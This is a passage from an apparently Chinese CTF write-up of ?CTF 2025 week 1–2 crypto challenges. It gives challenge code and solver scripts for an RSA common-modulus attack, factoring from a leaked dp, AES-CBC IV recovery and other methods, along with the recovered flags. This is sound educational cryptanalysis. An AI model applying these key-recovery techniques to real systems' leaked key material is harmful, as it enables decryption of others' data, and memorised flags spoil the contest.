class="string">&quot;0&quot;</span>,h+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        find(ph+<span class="string">&quot;1&quot;</span>,qh+<span class="string">&quot;0&quot;</span>,h+<span class="number">1</span>)</span><br><span class="line">        find(ph+<span class="string">&quot;0&quot;</span>,qh+<span class="string">&quot;1&quot;</span>,h+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">find(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;U5e_PruN1ng_41g0rI7hm_tO_sEarch&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="Week1-two-Es"><a href="#Week1-two-Es" class="headerlink" title="[Week1] two Es"></a>[Week1] two Es</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">e1 = random.getrandbits(<span class="number">32</span>)</span><br><span class="line">e2 = random.getrandbits(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e1, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e2, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;e1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;e2 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c2 = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 118951231851047571559217335117170383889369241506334435506974203511684612137655707364175506626353185266191175920454931743776877868558249224244622243762576178613428854425451444084313631798543697941971483572795632393388563520060136915983419489153783614798844426447471675798105689571205618922034550157013396634443</span></span><br><span class="line"><span class="string">e1 = 2819786085</span></span><br><span class="line"><span class="string">e2 = 4203935931</span></span><br><span class="line"><span class="string">c1 = 104852820628577684483432698430994392212341947538062367608937715761740532036933756841425619664673877530891898779701009843985308556306656168566466318961463247186202599188026358282735716902987474154862267239716349298652942506512193240265260314062483869461033708176350145497191865168924825426478400584516421567974</span></span><br><span class="line"><span class="string">c2 = 43118977673121220602933248973628727040318421596869003196014836853751584691920445952955467668612608693138227541764934104815818143729167823177291260165694321278079072309885687887255739841571920269405948846600660240154954071184064262133096801059918060973055211029726526524241753473771587909852399763354060832968</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>共模攻击</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">118951231851047571559217335117170383889369241506334435506974203511684612137655707364175506626353185266191175920454931743776877868558249224244622243762576178613428854425451444084313631798543697941971483572795632393388563520060136915983419489153783614798844426447471675798105689571205618922034550157013396634443</span></span><br><span class="line">e1 = <span class="number">2819786085</span></span><br><span class="line">e2 = <span class="number">4203935931</span></span><br><span class="line">c1 = <span class="number">104852820628577684483432698430994392212341947538062367608937715761740532036933756841425619664673877530891898779701009843985308556306656168566466318961463247186202599188026358282735716902987474154862267239716349298652942506512193240265260314062483869461033708176350145497191865168924825426478400584516421567974</span></span><br><span class="line">c2 = <span class="number">43118977673121220602933248973628727040318421596869003196014836853751584691920445952955467668612608693138227541764934104815818143729167823177291260165694321278079072309885687887255739841571920269405948846600660240154954071184064262133096801059918060973055211029726526524241753473771587909852399763354060832968</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">s,s1,s2=gmpy2.gcdext(e1,e2)</span><br><span class="line">m=(<span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n))%n</span><br><span class="line">m = gmpy2.iroot(m,s)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)).decode())</span><br><span class="line"><span class="comment"># flag&#123;s01v3_rO0T_bY_7he_S4mE_m0dU1u5&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Week1-Strange-Machine"><a href="#Week1-Strange-Machine" class="headerlink" title="[Week1] Strange Machine"></a>[Week1] Strange Machine</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> msg_len, offset, plaintext</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randbytes</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">flag = os.getenv(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你发现了一个奇怪的机器，它对你的消息进行了加密。&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你截获了这个机器第一次的密文，同时可以继续使用该机器进行加密。&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;注意:所有密文输出都经过 base64 编码，方便你复制分析。\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;1. 加密消息&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;2. 校验明文是否正确&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;3. 退出&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Key</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = randbytes(msg_len)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = self.seed[offset:] + self.seed[:offset]</span><br><span class="line">        <span class="keyword">return</span> self.seed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">msg</span>):</span><br><span class="line">    pad_len = msg_len - <span class="built_in">len</span>(msg)</span><br><span class="line">    <span class="keyword">return</span> msg + pad_len * long_to_bytes(pad_len)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg, key</span>):</span><br><span class="line">    cipher = xor(pad(msg), key)</span><br><span class="line">    <span class="keyword">return</span> b64encode(cipher)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    banner()</span><br><span class="line">    key = Key()</span><br><span class="line">    cur_key = key.generate()</span><br><span class="line">    cipher1 = encrypt(plaintext, cur_key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[*] 首次密文(base64):<span class="subst">&#123;cipher1&#125;</span>\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            menu()</span><br><span class="line">            choice = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">f&quot;[?] 请输入你的选择:&quot;</span>))</span><br><span class="line">            <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">                msg = <span class="built_in">input</span>(<span class="string">f&quot;[?] 请输入要加密的消息(长度小于等于<span class="subst">&#123;msg_len&#125;</span>): &quot;</span>).encode()</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(msg) &gt; msg_len:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[!] 输入消息过长，最长为 <span class="subst">&#123;msg_len&#125;</span> 字节\n&quot;</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                cur_key = key.generate()</span><br><span class="line">                cipher = encrypt(msg, cur_key)</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[*] 你的消息已加密(密文): <span class="subst">&#123;cipher&#125;</span>\n&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> choice == <span class="number">2</span>:</span><br><span class="line">                msg = <span class="built_in">input</span>(<span class="string">f&quot;[?] 请输入待校验的明文: &quot;</span>).encode()</span><br><span class="line">                <span class="keyword">if</span> msg == plaintext:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[*] 这是你的flag: <span class="subst">&#123;flag&#125;</span>\n&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[!] 校验错误!\n&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> choice == <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;再见~\n&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] 无效输入\n&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] 出现错误!\n&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>经过测试可以发现，第一次和第三次输入相同的明文，得到的密文是一样的，可以判断key循环了</p>
<p>因此第二次输入用于加密的密钥和加密<code>plaintext</code>所用的密钥是相同的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251004135857824.png" alt="image-20251004135857824"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">key,data</span>):</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        res += [key[i%<span class="built_in">len</span>(key)]^data[i]]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(res)</span><br><span class="line"></span><br><span class="line">m = <span class="string">b&#x27;1&#x27;</span>*<span class="number">16</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;FteGZOfSeL9IlSAOI5jTOA==&#x27;</span></span><br><span class="line">key = xor(m,base64.b64decode(data))</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;aI6bLLmWaegQynUfe93DCA==&#x27;</span></span><br><span class="line">res = xor(key,base64.b64decode(data))</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># b&#x27;Oh,you find it!\x01&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Week1-beyondHex"><a href="#Week1-beyondHex" class="headerlink" title="[Week1] beyondHex"></a>[Week1] beyondHex</h2><p>17进制</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = <span class="string">&#x27;807G6F429C7FA2200F46525G1350AB20G339D2GB7D8&#x27;</span></span><br><span class="line">res = <span class="built_in">int</span>(enc,<span class="number">17</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(res)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;welc0me_t0_?CTF!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Week1-certificate"><a href="#Week1-certificate" class="headerlink" title="[Week1] certificate"></a>[Week1] certificate</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIICewIBAAKBgQCdA0+pqynKvc3/BH5ojnUXBMdWy9Lzi9TwSaOgiJ6ky//QBrWG</span><br><span class="line">CNan98CYNcoKux2yOtHKIjxUrPh+LdgjmW+/paWPJyrnoQw5SqD+FvqNTjG7Akvx</span><br><span class="line">+TUXyMflL9qodrWBEbl/xmN01Qbivo36+U1mFDB+6LENk/3BwWXHVj0DvQIhAL7t</span><br><span class="line">Vc3/3jEFe+paWKNoTV++2B8D1T+ii7ZYsy3kU1yNAoGA????????????????????</span><br><span class="line">????????????????????????????????????????????????????????????????</span><br><span class="line">????????????????????????????????????????????????????????????????</span><br><span class="line">??????????????????????kCQQ??????????????????????????????????????</span><br><span class="line">????????????????????????????????????????????????AkE?????????????</span><br><span class="line">????????????????????????????????????????????????????????????????</span><br><span class="line">?????????wJAJrKFhI5pl/oBN2BZqLTf+NacGqTFrzmbi7RVFaN43kXYXu11urXy</span><br><span class="line">LTncfJXBpRhtGFdsL31jiswhiYRp9yjT+wJB????????????????????????????</span><br><span class="line">??????????????????????????????????????????????????????????MCQQ??</span><br><span class="line">????????????????????????????????????????????????????????????????</span><br><span class="line">????????????????????</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipher: 82404436498466895324733436901056359489189960512493202570903960333247277400247388969097533191635462377037232768074464944681385506170855774688613792302290304494481765906529480985984818897269069587516233500512849282866396228645039453616712857020451120948641770106851301755195757766245239907077580562163260112662</span><br></pre></td></tr></table></figure>

<p>题目泄露了部分私钥</p>
<p>根据私钥的格式，可以提取出<code>n e dp</code></p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/461349946">(PKCS1) RSA 公私钥 pem 文件解析</a></p>
<p>接着，根据泄露的东西，有以下数学关系</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e*dp == 1 mod (p-1)</span><br><span class="line">m^(e*dp) == m mod (p)</span><br><span class="line">p = GCD(m^(e*dp)-m,n)</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x00beed55cdffde31057bea5a58a3684d5fbed81f03d53fa28bb658b32de4535c8d</span></span><br><span class="line">n = <span class="number">0x009d034fa9ab29cabdcdff047e688e751704c756cbd2f38bd4f049a3a0889ea4cbffd006b58608d6a7f7c09835ca0abb1db23ad1ca223c54acf87e2dd823996fbfa5a58f272ae7a10c394aa0fe16fa8d4e31bb024bf1f93517c8c7e52fdaa876b58111b97fc66374d506e2be8dfaf94d6614307ee8b10d93fdc1c165c7563d03bd</span></span><br><span class="line">dp = <span class="number">0x26b285848e6997fa01376059a8b4dff8d69c1aa4c5af399b8bb45515a378de45d85eed75bab5f22d39dc7c95c1a5186d18576c2f7d638acc21898469f728d3fb</span></span><br><span class="line">c = <span class="number">82404436498466895324733436901056359489189960512493202570903960333247277400247388969097533191635462377037232768074464944681385506170855774688613792302290304494481765906529480985984818897269069587516233500512849282866396228645039453616712857020451120948641770106851301755195757766245239907077580562163260112662</span></span><br><span class="line"></span><br><span class="line">S = e*dp - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = <span class="number">2</span></span><br><span class="line">p = math.gcd(<span class="built_in">pow</span>(a, S, n) - <span class="number">1</span>, n)</span><br><span class="line">q = n // p</span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;This is your flag:flag&#123;4n_3xc3551v3ly_l4r93_publ1c_k3y_c4n_b3_pr0bl3m4t1c&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="Week2-AES-mode"><a href="#Week2-AES-mode" class="headerlink" title="[Week2] AES_mode"></a>[Week2] AES_mode</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">iv = flag.strip(<span class="string">b&#x27;flag&#123;&#x27;</span>).strip(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">hint = os.urandom(<span class="number">4</span>) * <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(hint)^bytes_to_long(key))</span><br><span class="line"></span><br><span class="line">msg = <span class="string">b&#x27;Welcome to ?CTF! , I hope you can have fun!!!!!!&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypto</span>(<span class="params">message</span>):</span><br><span class="line">    aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">    <span class="keyword">return</span> aes.encrypt(message)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(binascii.hexlify(encrypto(msg))[-<span class="number">32</span>:])</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">91749376808341004327450956291130629671202939702313462998246826182668975563684</span></span><br><span class="line"><span class="string">b&#x27;8f325d5b5c5454680628fa08746d67cf&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>参考链接：<a target="_blank" rel="noopener" href="https://github.com/natro92/2025WinTraining/blob/d45421d8e207c308f137441ee5e6e999d87f68df/CRYPTO/Part%201/23-Cry-Monday-%E7%AC%AC%E4%BA%8C%E8%8A%82%E8%AF%BE%E4%BD%9C%E4%B8%9A.md">CRYPTO&#x2F;Part 1&#x2F;23-Cry-Monday-第二节课作业.md</a></p>
<p>考察异或的一个知识点，因为hint的是4个随机字节重复8次，也就是32个，而key只有16位，所以两个异或之后，hint的一部分信息会显示出来（前16个），因此我们就可以复原hint，之后将复原出来的hint与结果异或一次就可以复原key了。</p>
<p>之后就是解AES，但是我们不知道iv，所以没办法用CBC的模式直接解密，但是根据提示，我们可以用ECB的方式解密，这两个只差一个异或，解密完了异或回去就可以得到iv，从而达到解密效果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c= <span class="string">b&#x27;8f325d5b5c5454680628fa08746d67cf&#x27;</span></span><br><span class="line">msg = <span class="string">b&#x27;Welcome to ?CTF! , I hope you can have fun!!!!!!&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(msg))</span><br><span class="line">tem=<span class="number">91749376808341004327450956291130629671202939702313462998246826182668975563684</span></span><br><span class="line"></span><br><span class="line">hint=long_to_bytes(tem)[:<span class="number">16</span>]*<span class="number">2</span></span><br><span class="line">key = bytes_to_long(hint)^tem</span><br><span class="line"><span class="comment"># print(key)</span></span><br><span class="line"></span><br><span class="line">key=long_to_bytes(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c</span>):</span><br><span class="line">    AES_ECB = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    decrypted = AES_ECB.decrypt(long_to_bytes(c))</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line">c3=decrypt(<span class="built_in">int</span>(c,<span class="number">16</span>))</span><br><span class="line">c2=bytes_to_long(c3)^bytes_to_long(msg[<span class="number">32</span>:<span class="number">48</span>])</span><br><span class="line">c2=decrypt(c2)</span><br><span class="line">c1=bytes_to_long(c2)^bytes_to_long(msg[<span class="number">16</span>:<span class="number">32</span>])</span><br><span class="line">c1=decrypt(c1)</span><br><span class="line">iv=bytes_to_long(c1)^bytes_to_long(msg[<span class="number">0</span>:<span class="number">16</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;flag&#123;&#x27;</span>+long_to_bytes(iv)+<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;CBc_Us3s_Iv!=ECb&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Week2-Common-RSA"><a href="#Week2-Common-RSA" class="headerlink" title="[Week2] Common RSA"></a>[Week2] Common RSA</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;flag&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line">hint = <span class="built_in">pow</span>(p + q, <span class="number">2</span>, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;e = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;hint = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 131597024257614620869648421307952022599943625170798058722475560465555374754170467986433278540604131619940641178519954230167502146438244308999511105433219427638803460889093328223802388178143540560813587991639442439109510325931982801296494725966519902673302205827914999084293810023067168509012158443748031939483</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = 1968659140793648429069472000786965200510587960406184785982668854732724642287423003255222009970017202179772168410459767605874195614574533370563277818681668876342943583147204497260995173839443989636764614809399895977498001560095317260220383552929292480197409615426208803132661827666690467265686165715909909838</span></span><br><span class="line"><span class="string">hint = 8041845809205494984282719083536906169105876887210623661715566866580197885950852556859414098121226785749033039450259965513505083753685569890927709072642971188655408152663342066047346862975209503093968807589977151718256296935551857116746970823854584764670720138775077146982697233376686489502015164620786724</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>moeCTF2025有道题一样的思路</p>
<p>已知<code>hint = pow(p + q, 2, n)</code>，则有<code>hint + k*n == p+q</code></p>
<p>因为<code>n=p*q</code>因此<code>k</code>最大也就是4</p>
<p>爆破<code>k</code>求出<code>p+q</code></p>
<p>接着求出p和q的值，因为phi和e不互素</p>
<p>用AMM或者有限域开方求出flag</p>
<p>求p和q</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">e, p</span>):</span><br><span class="line">    root = []</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(root) &lt; e:</span><br><span class="line">        a = random.randint(<span class="number">2</span>, p - <span class="number">1</span>)</span><br><span class="line">        res = <span class="built_in">pow</span>(a, (p - <span class="number">1</span>) // e, p)</span><br><span class="line">        <span class="keyword">if</span> res <span class="keyword">not</span> <span class="keyword">in</span> root:</span><br><span class="line">            root.append(res)</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM</span>(<span class="params">residue, e, p</span>):</span><br><span class="line">    <span class="comment"># 计算t,s</span></span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = p - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s % e == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        s = s // e</span><br><span class="line"></span><br><span class="line">    d = gmpy2.invert(e, s)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> t == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">pow</span>(residue, d, p)</span><br><span class="line"></span><br><span class="line">    noresidue = random.randint(<span class="number">1</span>, p)</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">pow</span>(noresidue, (p - <span class="number">1</span>) // e, p) == <span class="number">1</span>:</span><br><span class="line">        noresidue = random.randint(<span class="number">1</span>, p)</span><br><span class="line">    a = <span class="built_in">pow</span>(noresidue, (e ** (t - <span class="number">1</span>)) * s, p)</span><br><span class="line">    b = <span class="built_in">pow</span>(residue, e * d - <span class="number">1</span>, p)</span><br><span class="line">    c = <span class="built_in">pow</span>(noresidue, s, p)</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t):</span><br><span class="line">        d = <span class="built_in">pow</span>(b, e ** (t - <span class="number">1</span> - i), p)</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = -math.log(d, a)</span><br><span class="line">        b = <span class="built_in">pow</span>(<span class="built_in">pow</span>(c, e, p), j, p) * b % p</span><br><span class="line">        h = <span class="built_in">pow</span>(c, j, p) * h % p</span><br><span class="line">        c = <span class="built_in">pow</span>(c, e, p)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(residue, d, p) * h % p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_Mi</span>(<span class="params">m_list, m</span>):</span><br><span class="line">    M_list = []</span><br><span class="line">    <span class="keyword">for</span> mi <span class="keyword">in</span> m_list:</span><br><span class="line">        M_list.append(m // mi)</span><br><span class="line">    <span class="keyword">return</span> M_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_resMi</span>(<span class="params">M_list, m_list</span>):</span><br><span class="line">    resM_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(M_list)):</span><br><span class="line">        resM_list.append(Get_ni(M_list[i], m_list[i])[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> resM_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_ni</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        x = <span class="number">1</span></span><br><span class="line">        y = <span class="number">0</span></span><br><span class="line">        q = a</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br><span class="line">    ret = Get_ni(b, a % b)</span><br><span class="line">    x = ret[<span class="number">0</span>]</span><br><span class="line">    y = ret[<span class="number">1</span>]</span><br><span class="line">    q = ret[<span class="number">2</span>]</span><br><span class="line">    temp = x</span><br><span class="line">    x = y</span><br><span class="line">    y = temp - a // b * y</span><br><span class="line">    <span class="keyword">return</span> x, y, q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 